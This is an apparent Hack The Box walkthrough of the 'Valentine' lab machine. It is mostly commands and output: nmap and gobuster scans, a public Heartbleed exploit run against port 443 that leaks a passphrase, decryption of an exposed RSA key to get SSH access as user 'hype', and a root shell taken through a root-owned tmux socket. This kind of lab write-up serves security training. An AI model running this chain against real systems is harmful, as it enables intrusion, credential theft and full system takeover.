# Valentine Walkthrough

![valentine](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Valentine/valentine.png)

## Let's first Scan our machine with nmap.

### Initial Scan

```
sudo nmap -F -sV 10.10.10.79
```

### Result

```
PORT    STATE SERVICE  VERSION 
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0) 
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu)) 
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu)) 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Final Scan

```
sudo nmap -A -O -v --script vuln 10.10.10.79
```

### Result

```
PORT    STATE SERVICE  VERSION 
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0) 
| vulners:  
|   cpe:/a:openbsd:openssh:5.9p1:  
|       SSV:60656       5.0     https://vulners.com/seebug/SSV:60656    *EXPLOIT* 
|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919 
|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906 
|       CVE-2010-5107   5.0     https://vulners.com/cve/CVE-2010-5107 
|       SSV:90447       4.6     https://vulners.com/seebug/SSV:90447    *EXPLOIT* 
|       CVE-2016-0778   4.6     https://vulners.com/cve/CVE-2016-0778 
|       MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/     4.3     https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE
-2020-14145/    *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP9-CVE-2020-14145/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP8-CVE-2020-14145/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP5-CVE-2020-14145/     *EXPLOIT* 
|       MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/   4.3     https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/ *
EXPLOIT* 
|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145 
|       MSF:ILITIES/UBUNTU-CVE-2016-0777/       4.0     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2016-0777/     *
EXPLOIT* 
|       MSF:ILITIES/IBM-AIX-CVE-2016-0777/      4.0     https://vulners.com/metasploit/MSF:ILITIES/IBM-AIX-CVE-2016-0777/    *
EXPLOIT* 
|       MSF:ILITIES/DEBIAN-CVE-2016-0777/       4.0     https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2016-0777/     *
EXPLOIT* 
|       MSF:ILITIES/AIX-7.2-OPENSSH_ADVISORY7_CVE-2016-0777/    4.0     https://vulners.com/metasploit/MSF:ILITIES/AIX-7.2-OPE
NSSH_ADVISORY7_CVE-2016-0777/   *EXPLOIT* 
|       MSF:ILITIES/AIX-7.1-OPENSSH_ADVISORY7_CVE-2016-0777/    4.0     https://vulners.com/metasploit/MSF:ILITIES/AIX-7.1-OPE
NSSH_ADVISORY7_CVE-2016-0777/   *EXPLOIT* 
|       MSF:ILITIES/AIX-5.3-OPENSSH_ADVISORY7_CVE-2016-0777/    4.0     https://vulners.com/metasploit/MSF:ILITIES/AIX-5.3-OPE
NSSH_ADVISORY7_CVE-2016-0777/   *EXPLOIT* 
|_      CVE-2016-0777   4.0     https://vulners.com/cve/CVE-2016-0777 
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu)) 
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities. 
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug) 
| http-enum:  
|   /dev/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)' 
|_  /index/: Potentially interesting folder 
|_http-dombased-xss: Couldn't find any DOM based XSS. 
|_http-csrf: Couldn't find any CSRF vulnerabilities. 
|_http-server-header: Apache/2.2.22 (Ubuntu) 
| vulners:  
|   cpe:/a:apache:http_server:2.2.22:  
|       SSV:60913       7.5     https://vulners.com/seebug/SSV:60913    *EXPLOIT* 
|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679 
|       CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668 
|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169 
|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167 
|       CVE-2013-2249   7.5     https://vulners.com/cve/CVE-2013-2249 
|       MSF:ILITIES/UBUNTU-CVE-2018-1312/       6.8     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1312/     *
EXPLOIT* 
|       MSF:ILITIES/LINUXRPM-RHSA-2013-1012/    6.8     https://vulners.com/metasploit/MSF:ILITIES/LINUXRPM-RHSA-2013-1012/  *
EXPLOIT* 
|       MSF:ILITIES/LINUXRPM-RHSA-2013-1011/    6.8     https://vulners.com/metasploit/MSF:ILITIES/LINUXRPM-RHSA-2013-1011/  *
EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/       6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP3-CVE-2018-1312/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/       6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP2-CVE-2018-1312/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/       6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP1-CVE-2018-1312/      *EXPLOIT* 
|       MSF:ILITIES/CENTOS_LINUX-CVE-2017-17790/        6.8     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-20
17-17790/       *EXPLOIT* 
|       MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/ 6.8     https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/
*EXPLOIT* 
|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312 
|       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788 
|       MSF:ILITIES/LINUXRPM-RHSA-2013-1208/    5.4     https://vulners.com/metasploit/MSF:ILITIES/LINUXRPM-RHSA-2013-1208/  *
EXPLOIT* 
|       MSF:ILITIES/LINUXRPM-RHSA-2013-1207/    5.4     https://vulners.com/metasploit/MSF:ILITIES/LINUXRPM-RHSA-2013-1207/  *
EXPLOIT* 
|       SSV:60788       5.1     https://vulners.com/seebug/SSV:60788    *EXPLOIT* 
|       CVE-2013-1862   5.1     https://vulners.com/cve/CVE-2013-1862 
|       SSV:96537       5.0     https://vulners.com/seebug/SSV:96537    *EXPLOIT* 
|       SSV:62058       5.0     https://vulners.com/seebug/SSV:62058    *EXPLOIT* 
|       SSV:61874       5.0     https://vulners.com/seebug/SSV:61874    *EXPLOIT* 
|       MSF:ILITIES/SUSE-CVE-2014-0231/ 5.0     https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2014-0231/  *EXPLOIT* 
|       MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED  5.0     https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APAC
HE_OPTIONSBLEED *EXPLOIT* 
|       EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    5.0     https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0
405CB0AA9C075D  *EXPLOIT* 
|       EDB-ID:42745    5.0     https://vulners.com/exploitdb/EDB-ID:42745      *EXPLOIT* 
|       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798 
|       CVE-2014-0231   5.0     https://vulners.com/cve/CVE-2014-0231 
|       CVE-2014-0098   5.0     https://vulners.com/cve/CVE-2014-0098 
|       CVE-2013-6438   5.0     https://vulners.com/cve/CVE-2013-6438 
|       CVE-2013-5704   5.0     https://vulners.com/cve/CVE-2013-5704 
|       1337DAY-ID-28573        5.0     https://vulners.com/zdt/1337DAY-ID-28573        *EXPLOIT* 
|       SSV:60905       4.3     https://vulners.com/seebug/SSV:60905    *EXPLOIT* 
|       SSV:60657       4.3     https://vulners.com/seebug/SSV:60657    *EXPLOIT* 
|       SSV:60653       4.3     https://vulners.com/seebug/SSV:60653    *EXPLOIT* 
|       SSV:60345       4.3     https://vulners.com/seebug/SSV:60345    *EXPLOIT* 
|       MSF:ILITIES/SUSE-CVE-2012-4558/ 4.3     https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2012-4558/  *EXPLOIT* 
|       MSF:ILITIES/SUSE-CVE-2012-3499/ 4.3     https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2012-3499/  *EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2012-4558/       4.3     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2012-4558/      *EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2012-3499/      4.3     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2012-3499/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/       4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP2-CVE-2016-4975/      *EXPLOIT* 
|       MSF:ILITIES/HPUX-CVE-2012-4558/ 4.3     https://vulners.com/metasploit/MSF:ILITIES/HPUX-CVE-2012-4558/  *EXPLOIT* 
|       MSF:ILITIES/CENTOS_LINUX-CVE-2012-4558/ 4.3     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2012-4558/
*EXPLOIT* 
|       MSF:ILITIES/CENTOS_LINUX-CVE-2012-3499/ 4.3     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2012-3499/
*EXPLOIT* 
|       MSF:ILITIES/APACHE-HTTPD-CVE-2012-4558/ 4.3     https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2012-4558/
*EXPLOIT* 
|       MSF:ILITIES/APACHE-HTTPD-CVE-2012-3499/ 4.3     https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2012-3499/
*EXPLOIT* 
|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975 
|       CVE-2013-1896   4.3     https://vulners.com/cve/CVE-2013-1896 
|       CVE-2012-4558   4.3     https://vulners.com/cve/CVE-2012-4558 
|       CVE-2012-3499   4.3     https://vulners.com/cve/CVE-2012-3499 
|_      CVE-2012-2687   2.6     https://vulners.com/cve/CVE-2012-2687 
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu)) 
| ssl-heartbleed:  
|   VULNERABLE: 
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealin
g information intended to be protected by SSL/TLS encryption. 
|     State: VULNERABLE 
|     Risk factor: High 
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heart
bleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for discl
osure of otherwise encrypted confidential information as well as the encryption keys themselves. 
|            
|     References: 
|       http://cvedetails.com/cve/2014-0160/ 
|       http://www.openssl.org/news/secadv_20140407.txt  
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160 
|_http-dombased-xss: Couldn't find any DOM based XSS. 
| http-enum:  
|   /dev/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)' 
|_  /index/: Potentially interesting folder 
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities. 
| ssl-poodle:  
|   VULNERABLE: 
|   SSL POODLE information leak 
|     State: VULNERABLE 
|     IDs:  BID:70574  CVE:CVE-2014-3566 
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other 
|           products, uses nondeterministic CBC padding, which makes it easier 
|           for man-in-the-middle attackers to obtain cleartext data via a 
|           padding-oracle attack, aka the "POODLE" issue. 
|     Disclosure date: 2014-10-14 
|     Check results: 
|       TLS_RSA_WITH_AES_128_CBC_SHA 
|     References: 
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566 
|       https://www.imperialviolet.org/2014/10/14/poodle.html 
|       https://www.securityfocus.com/bid/70574 
|_      https://www.openssl.org/~bodo/ssl-poodle.pdf 
| ssl-ccs-injection:  
|   VULNERABLE: 
|   SSL/TLS MITM vulnerability (CCS Injection) 
|     State: VULNERABLE 
|     Risk factor: High 
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h 
|       does not properly restrict processing of ChangeCipherSpec messages, 
|       which allows man-in-the-middle attackers to trigger use of a zero 
|       length master key in certain OpenSSL-to-OpenSSL communications, and 
|       consequently hijack sessions or obtain sensitive information, via 
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability. 
|            
|     References: 
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224 
|       http://www.openssl.org/news/secadv_20140605.txt 
|_      http://www.cvedetails.com/cve/2014-0224 
|_http-csrf: Couldn't find any CSRF vulnerabilities. 
|_http-server-header: Apache/2.2.22 (Ubuntu) 
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug) 
| vulners:  
|   cpe:/a:apache:http_server:2.2.22:  
|       SSV:60913       7.5     https://vulners.com/seebug/SSV:60913    *EXPLOIT* 
|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679 
|       CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668 
|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169 
|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167 
|       CVE-2013-2249   7.5     https://vulners.com/cve/CVE-2013-2249 
|       MSF:ILITIES/UBUNTU-CVE-2018-1312/       6.8     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1312/     *
EXPLOIT* 
|       MSF:ILITIES/LINUXRPM-RHSA-2013-1012/    6.8     https://vulners.com/metasploit/MSF:ILITIES/LINUXRPM-RHSA-2013-1012/  *
EXPLOIT* 
|       MSF:ILITIES/LINUXRPM-RHSA-2013-1011/    6.8     https://vulners.com/metasploit/MSF:ILITIES/LINUXRPM-RHSA-2013-1011/  *
EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/       6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP3-CVE-2018-1312/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/       6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP2-CVE-2018-1312/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/       6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP1-CVE-2018-1312/      *EXPLOIT* 
|       MSF:ILITIES/CENTOS_LINUX-CVE-2017-17790/        6.8     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-20
17-17790/       *EXPLOIT* 
|       MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/ 6.8     https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/
*EXPLOIT* 
|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312 
|       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788 
|       MSF:ILITIES/LINUXRPM-RHSA-2013-1208/    5.4     https://vulners.com/metasploit/MSF:ILITIES/LINUXRPM-RHSA-2013-1208/  *
EXPLOIT* 
|       MSF:ILITIES/LINUXRPM-RHSA-2013-1207/    5.4     https://vulners.com/metasploit/MSF:ILITIES/LINUXRPM-RHSA-2013-1207/  *
EXPLOIT* 
|       SSV:60788       5.1     https://vulners.com/seebug/SSV:60788    *EXPLOIT* 
|       CVE-2013-1862   5.1     https://vulners.com/cve/CVE-2013-1862 
|       SSV:96537       5.0     https://vulners.com/seebug/SSV:96537    *EXPLOIT* 
|       SSV:62058       5.0     https://vulners.com/seebug/SSV:62058    *EXPLOIT* 
|       SSV:61874       5.0     https://vulners.com/seebug/SSV:61874    *EXPLOIT* 
|       MSF:ILITIES/SUSE-CVE-2014-0231/ 5.0     https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2014-0231/  *EXPLOIT* 
|       MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED  5.0     https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APAC
HE_OPTIONSBLEED *EXPLOIT* 
|       EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    5.0     https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0
405CB0AA9C075D  *EXPLOIT* 
|       EDB-ID:42745    5.0     https://vulners.com/exploitdb/EDB-ID:42745      *EXPLOIT* 
|       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798 
|       CVE-2014-0231   5.0     https://vulners.com/cve/CVE-2014-0231 
|       CVE-2014-0098   5.0     https://vulners.com/cve/CVE-2014-0098 
|       CVE-2013-6438   5.0     https://vulners.com/cve/CVE-2013-6438 
|       CVE-2013-5704   5.0     https://vulners.com/cve/CVE-2013-5704 
|       1337DAY-ID-28573        5.0     https://vulners.com/zdt/1337DAY-ID-28573        *EXPLOIT* 
|       SSV:60905       4.3     https://vulners.com/seebug/SSV:60905    *EXPLOIT* 
|       SSV:60657       4.3     https://vulners.com/seebug/SSV:60657    *EXPLOIT* 
|       SSV:60653       4.3     https://vulners.com/seebug/SSV:60653    *EXPLOIT* 
|       SSV:60345       4.3     https://vulners.com/seebug/SSV:60345    *EXPLOIT* 
|       MSF:ILITIES/SUSE-CVE-2012-4558/ 4.3     https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2012-4558/  *EXPLOIT* 
|       MSF:ILITIES/SUSE-CVE-2012-3499/ 4.3     https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2012-3499/  *EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2012-4558/       4.3     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2012-4558/      *EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2012-3499/      4.3     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2012-3499/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/       4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP2-CVE-2016-4975/      *EXPLOIT* 
|       MSF:ILITIES/HPUX-CVE-2012-4558/ 4.3     https://vulners.com/metasploit/MSF:ILITIES/HPUX-CVE-2012-4558/  *EXPLOIT* 
|       MSF:ILITIES/CENTOS_LINUX-CVE-2012-4558/ 4.3     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2012-4558/
*EXPLOIT* 
|       MSF:ILITIES/CENTOS_LINUX-CVE-2012-3499/ 4.3     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2012-3499/
*EXPLOIT* 
|       MSF:ILITIES/APACHE-HTTPD-CVE-2012-4558/ 4.3     https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2012-4558/
*EXPLOIT* 
|       MSF:ILITIES/APACHE-HTTPD-CVE-2012-3499/ 4.3     https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2012-3499/
*EXPLOIT* 
|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975 
|       CVE-2013-1896   4.3     https://vulners.com/cve/CVE-2013-1896 
|       CVE-2012-4558   4.3     https://vulners.com/cve/CVE-2012-4558 
|       CVE-2012-3499   4.3     https://vulners.com/cve/CVE-2012-3499 
|_      CVE-2012-2687   2.6     https://vulners.com/cve/CVE-2012-2687 
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). 
TCP/IP fingerprint: 
OS:SCAN(V=7.92%E=4%D=4/7%OT=22%CT=1%CU=41389%PV=Y%DS=2%DC=T%G=Y%TM=624E6B96 
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=8)OPS( 
OS:O1=M505ST11NW4%O2=M505ST11NW4%O3=M505NNT11NW4%O4=M505ST11NW4%O5=M505ST11 
OS:NW4%O6=M505ST11)WIN(W1=3890%W2=3890%W3=3890%W4=3890%W5=3890%W6=3890)ECN( 
OS:R=Y%DF=Y%T=40%W=3908%O=M505NNSNW4%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS 
OS:%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=3890%S=O%A=S+%F=AS%O=M505ST11NW4%RD=0 
OS:%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z 
OS:%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y 
OS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RI 
OS:PL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) 
 
Uptime guess: 197.263 days (since Wed Sep 22 03:52:54 2021) 
Network Distance: 2 hops 
TCP Sequence Prediction: Difficulty=261 (Good luck!) 
IP ID Sequence Generation: All zeros 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 
 
TRACEROUTE (using port 587/tcp) 
HOP RTT       ADDRESS 
1   266.34 ms 10.10.14.1 
2   265.52 ms 10.10.10.79
```

## We got 3 port open let's first access http port using browser, here we got a image after accessing http port.

![http](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Valentine/http.png)

## Let's start gobuster for finding hidden directories.

```
gobuster dir -u 10.10.10.79 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 --no-error
``` 

### Result

```
=============================================================== 
/index                (Status: 200) [Size: 38] 
/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.79/dev/] 
/encode               (Status: 200) [Size: 554]                               
/decode               (Status: 200) [Size: 552]                               
/omg                  (Status: 200) [Size: 153356]                            
/server-status        (Status: 403) [Size: 292]
```

## We got two files in /dev directory.

![dev](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Valentine/dev.png)

## let's first read notes.txt file

![note](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Valentine/note.png)

## We got some to do: after reading we find encoder and decoder both are not working properly . 

## let's see the content of other file named hype_key

## we got hexadecimal values, let's download this file using wget 

```
wget https://10.10.10.79/dev/hype_key --no-check-certificate
```

## let's decode it hexadecimal to text 

```
cat hype_key | xxd -r -p > hype_encrypted
```

### -r = reverse operation: convert (or patch) hexdump into binary.
### -p = output in postscript plain hexdump style.

## now we got a encrypted rsa key while we try to decrypt rsa key we need a passphase. 

## we know site is vulnrable to heart bleed we found this nmap final scan , let's search for heartbleed exploit, i got a github heartbleed exploit https://gist.github.com/eelsivart/10174134 let's use this .

## first make a file and add valentine ip and port example given below.

![host](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Valentine/host.png)

## now use below command

```
python2 heartbleed.py -p 443 -f host.txt --num=100
```

### Result

```
defribulator v1.16 
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160) 
 
################################################################## 
Connecting to: 10.10.10.79:443, 100 times 
Sending Client Hello for TLSv1.0 
Received Server Hello for TLSv1.0 
 
WARNING: 10.10.10.79:443 returned more data than it should - server is vulnerable! 
Please wait... connection attempt 100 of 100 
################################################################## 
 
.@....SC[...r....+..H...9... 
....w.3....f... 
...!.9.8.........5............... 
.........3.2.....E.D...../...A.................................I......... 
........... 
...................................#.......0.0.1/decode.php 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 42 
 
$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==.sV. 
....6".tX 
q.@....SC[...r....+..H...9... 
....w.3....f... 
...!.9.8.........5............... 
.........3.2.....E.D...../...A.................................I......... 
........... 
...................................#.......0.0.1/decode.php 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 42
```

## we got a same base64 hash in every attempt save it in a file and then let's try to decode it.

```
base64 -d hash.txt
```

### Result

```
heartbleedbelievethehype
```

## let's try this as passphase we need for decrypt rsa key.

```
openssl rsa -in encrypted_rsa.txt -out decrypted_rsa
```

## we successfully decypt rsa key let's try to access user hype using ssh.

```
ssh -i decrypted_rsa hype@10.10.10.79
```

# BOOOMMM!!! WE GOT HYPE USER SHELL

## Now it's time for priv escalation [post exploitation]

## after reading .bash_history we find tmux tool is run before output of bash_history file given below

```
hype@Valentine:~$ cat .bash_history 
 
exit 
exot 
exit 
ls -la 
cd / 
ls -la 
cd .devs 
ls -la 
tmux -L dev_sess  
tmux a -t dev_sess  
tmux --help 
tmux -S /.devs/dev_sess  
exit
```

## let's go to the .devs directory we find a file name dev_sess, after doing ls -la we got this file has root permission.

## using below tmux command we got root shell

```
tmux -S /.devs/dev_sess
```

![root](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Valentine/root.png)

# BOOOMMMM!!! Machine solved

![funny](https://i.gifer.com/fetch/w300-preview/62/625b27babc643074993ee1cd336555aa.gif)
